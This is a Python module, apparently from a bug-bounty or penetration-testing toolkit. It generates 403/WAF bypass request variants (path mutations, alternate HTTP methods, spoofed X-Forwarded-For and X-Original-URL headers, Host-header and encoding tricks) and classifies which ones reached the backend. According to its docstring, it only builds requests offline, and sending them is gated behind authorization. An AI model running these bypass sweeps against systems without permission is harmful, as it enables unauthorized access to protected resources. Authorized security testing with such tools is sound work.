"""
Automated 403 / WAF bypass (attack section, suggestion #4).

Turns the CLAUDE.md "403 WAF bypass methodology" checklist into a runnable generator: given a URL it
emits the systematic permutation set (path / method / header / host-header / encoding / root-only),
each a structured request spec with the technique + rationale. `analyze()` diffs the bypass responses
against the baseline to produce the "WAF response vs Backend response" table the methodology requires.

Generation + analysis only (deterministic, offline). Sending the requests is the gated executor's job,
so a 403-bypass sweep against a target only runs once the bug-bounty authorization gate has allowed it.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Dict, List
from urllib.parse import urlparse


@dataclass
class BypassAttempt:
    technique: str
    category: str
    method: str
    url: str
    headers: Dict[str, str]
    reason: str

    def to_dict(self) -> Dict:
        return {"technique": self.technique, "category": self.category, "method": self.method,
                "url": self.url, "headers": self.headers, "reason": self.reason}


_METHODS = ["OPTIONS", "PUT", "DELETE", "PATCH", "TRACE", "HEAD", "CONNECT", "POST"]
_PATH_MUTATORS = [
    ("/%2e{path}", "url-encoded dot prefix"),
    ("{path}/..;/", "path-parameter traversal (;)"),
    ("{path};/", "trailing semicolon"),
    ("/{path_noslash}", "double leading slash" ),
    ("/.{path}", "dot-slash prefix"),
    ("{path}/.", "trailing dot"),
    ("{path}%20", "trailing space"),
    ("{path}%09", "trailing tab"),
    ("{path}?", "trailing question mark"),
    ("{path}#", "trailing fragment"),
    ("{path_upper}", "case variation"),
]
_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Original-URL": "{path}"},
    {"X-Rewrite-URL": "{path}"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Real-IP": "127.0.0.1"},
    {"Referer": "{origin}"},
]


class Bypass403Generator:
    def permutations(self, url: str, method: str = "GET") -> List[BypassAttempt]:
        p = urlparse(url if "://" in url else f"https://{url}")
        scheme, host = p.scheme or "https", p.netloc or p.path
        path = p.path or "/"
        path_noslash = path.lstrip("/")
        base = f"{scheme}://{host}"
        origin = base
        out: List[BypassAttempt] = []

        # 1) path-based
        for tmpl, reason in _PATH_MUTATORS:
            np = tmpl.format(path=path, path_noslash=path_noslash, path_upper=path.upper())
            out.append(BypassAttempt("path", "path-based", method, f"{base}{np}", {}, reason))
        # 2) method-based
        for m in _METHODS:
            out.append(BypassAttempt("method", "method-based", m, url, {},
                                     f"alternate verb {m}"))
        # 3) header-based
        for h in _BYPASS_HEADERS:
            hdr = {k: v.format(path=path, origin=origin) for k, v in h.items()}
            out.append(BypassAttempt("header", "header-based", method, url, hdr,
                                     f"injected {list(hdr)[0]}"))
        # 4) host-header
        for hv in ("localhost", "127.0.0.1"):
            out.append(BypassAttempt("host", "host-header", method, url, {"Host": hv},
                                     f"Host: {hv}"))
        # 5) encoding
        for enc, reason in ((path.replace("/", "%2f"), "url-encoded slashes"),
                            (path.replace("/", "%252f"), "double-encoded slashes")):
            out.append(BypassAttempt("encoding", "encoding", method, f"{base}{enc}", {}, reason))
        # 6) root-only protection probe
        out.append(BypassAttempt("root-probe", "root-only", method, f"{base}/", {},
                                 "compare protected path vs site root"))
        return out

    def report(self, url: str, method: str = "GET") -> Dict:
        perms = self.permutations(url, method)
        cats: Dict[str, int] = {}
        for a in perms:
            cats[a.category] = cats.get(a.category, 0) + 1
        return {"url": url, "method": method,
                "attempts": [a.to_dict() for a in perms], "count": len(perms),
                "by_category": dict(sorted(cats.items())), "advisory": True}

    @staticmethod
    def analyze(baseline: Dict, responses: List[Dict]) -> Dict:
        """Diff bypass responses vs the baseline 403 to separate WAF blocks from backend reaches.

        baseline / each response: {"technique","status","length"}. A bypass "reached the backend"
        when its status differs from the baseline block (e.g. 200/301/500 instead of 403/401)."""
        b_status = baseline.get("status")
        rows, reached = [], []
        for r in responses:
            backend = r.get("status") not in (b_status, 401, 403, 429)
            rows.append({"technique": r.get("technique"), "status": r.get("status"),
                         "length": r.get("length"), "verdict": "backend" if backend else "waf"})
            if backend:
                reached.append(r.get("technique"))
        return {"baseline_status": b_status, "table": rows,
                "backend_reached": sorted(set(reached)), "bypassed": bool(reached),
                "advisory": True}
